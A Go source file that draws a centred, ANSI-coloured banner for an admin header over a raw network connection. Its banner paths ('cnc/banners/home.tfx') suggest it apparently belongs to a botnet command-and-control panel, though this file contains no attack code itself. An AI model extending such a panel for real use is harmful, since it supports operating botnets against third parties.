package main

import (
	"io/ioutil"
	"net"
	"strings"
	"unicode/utf8"

	"github.com/mattn/go-runewidth"
)

type terminalWidthProvider interface {
	TerminalWidth() int
}

func currentTerminalWidth(conn net.Conn) int {
	if provider, ok := conn.(terminalWidthProvider); ok {
		width := provider.TerminalWidth()
		if width > 0 {
			return width
		}
	}
	return 120
}

func runeVisualWidth(r rune) int {
	if r == '\t' {
		return 4
	}
	width := runewidth.RuneWidth(r)
	if width < 0 {
		return 0
	}
	return width
}

func bannerLineMetrics(line string) (leading int, total int, hasVisibleText bool) {
	clean := stripANSICodes(strings.TrimRight(line, "\r"))
	if strings.TrimSpace(clean) == "" {
		return 0, 0, false
	}

	inLeading := true
	for _, r := range clean {
		w := runeVisualWidth(r)
		total += w
		if inLeading {
			if r == ' ' || r == '\t' {
				leading += w
			} else {
				inLeading = false
			}
		}
	}

	return leading, total, true
}

func trimVisibleLeading(line string, removeWidth int) string {
	if removeWidth <= 0 || line == "" {
		return line
	}

	var out strings.Builder
	out.Grow(len(line))

	removed := 0
	inLeading := true

	for i := 0; i < len(line); {
		if line[i] == 0x1b {
			j := i + 1
			if j < len(line) && line[j] == '[' {
				j++
				for j < len(line) && line[j] != 'm' {
					j++
				}
				if j < len(line) {
					j++
				}
			}
			out.WriteString(line[i:j])
			i = j
			continue
		}

		r, size := utf8.DecodeRuneInString(line[i:])
		if r == utf8.RuneError && size == 1 {
			r = rune(line[i])
		}

		if inLeading && removed < removeWidth && (r == ' ' || r == '\t') {
			w := runeVisualWidth(r)
			if removed+w <= removeWidth {
				removed += w
				i += size
				continue
			}

			remaining := removed + w - removeWidth
			if remaining > 0 {
				out.WriteString(strings.Repeat(" ", remaining))
			}
			removed = removeWidth
			i += size
			continue
		}

		if inLeading && r != ' ' && r != '\t' {
			inLeading = false
		}

		out.WriteRune(r)
		i += size
	}

	return out.String()
}

func writeCenteredBanner(conn net.Conn, banner string, terminalWidth int) {
	normalized := strings.ReplaceAll(banner, "\r\n", "\n")
	normalized = strings.ReplaceAll(normalized, "\r", "\n")
	lines := strings.Split(normalized, "\n")

	minLeading := -1
	metrics := make([]struct {
		line    string
		leading int
		total   int
		visible bool
	}, len(lines))

	for i, line := range lines {
		leading, total, visible := bannerLineMetrics(line)
		metrics[i] = struct {
			line    string
			leading int
			total   int
			visible bool
		}{line: line, leading: leading, total: total, visible: visible}

		if !visible {
			continue
		}

		if minLeading == -1 || leading < minLeading {
			minLeading = leading
		}
	}

	if minLeading < 0 {
		minLeading = 0
	}

	maxTrimmedWidth := 0
	for i, metric := range metrics {
		if !metric.visible {
			continue
		}

		trimmedLine := trimVisibleLeading(metric.line, minLeading)
		_, trimmedWidth, _ := bannerLineMetrics(trimmedLine)
		metrics[i].line = trimmedLine
		metrics[i].total = trimmedWidth
		if trimmedWidth > maxTrimmedWidth {
			maxTrimmedWidth = trimmedWidth
		}
	}

	leftPadding := (terminalWidth - maxTrimmedWidth) / 2
	if leftPadding < 0 {
		leftPadding = 0
	}

	for _, metric := range metrics {
		if !metric.visible {
			conn.Write([]byte("\r\n"))
			continue
		}

		conn.Write([]byte(strings.Repeat(" ", leftPadding) + metric.line + ansiReset + "\r\n"))
	}
}

func writePinkCyanAdminHeader(conn net.Conn, user *User) {
	terminalWidth := currentTerminalWidth(conn)
	bannerPaths := []string{
		"banners/home.tfx",
		"cnc/banners/home.tfx",
	}

	for _, path := range bannerPaths {
		banner, err := ioutil.ReadFile(path)
		if err != nil || len(banner) == 0 {
			continue
		}

		writeCenteredBanner(conn, string(banner), terminalWidth)
		conn.Write([]byte("\r\n"))
		return
	}

	writeDefaultAdminHeader(conn, user)
}
